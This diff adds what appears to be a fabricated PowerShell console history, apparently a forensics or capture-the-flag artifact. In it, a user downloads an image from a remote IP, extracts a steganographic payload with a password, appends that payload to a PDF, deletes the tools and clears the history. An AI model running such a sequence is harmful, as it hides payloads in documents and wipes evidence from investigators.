@@ -1,0 +1,19 @@
+# PowerShell Console History Dump
+# Exported: 2026-07-14 09:28:15
+
+PS C:\> whoami
+mofcg\d.suherman
+PS C:\> netstat -ano | findstr 443
+  TCP    10.0.0.50:55432    192.0.2.205:443      ESTABLISHED     9924
+PS C:\> cd C:\Users\Public\Downloads
+PS C:\Users\Public\Downloads> Invoke-WebRequest -Uri http://192.0.2.205/assets/web_ad_banner.jpg -OutFile banner.jpg
+PS C:\Users\Public\Downloads> Get-FileHash banner.jpg
+PS C:\Users\Public\Downloads> .\stg.exe extract -sf banner.jpg -p "MOFCG2026"
+PS C:\Users\Public\Downloads> type payload.txt >> ..\EVD-DOC-001.pdf
+PS C:\Users\Public\Downloads> del banner.jpg
+PS C:\Users\Public\Downloads> del payload.txt
+PS C:\Users\Public\Downloads> del stg.exe
+PS C:\Users\Public\Downloads> Clear-History
+
+
+
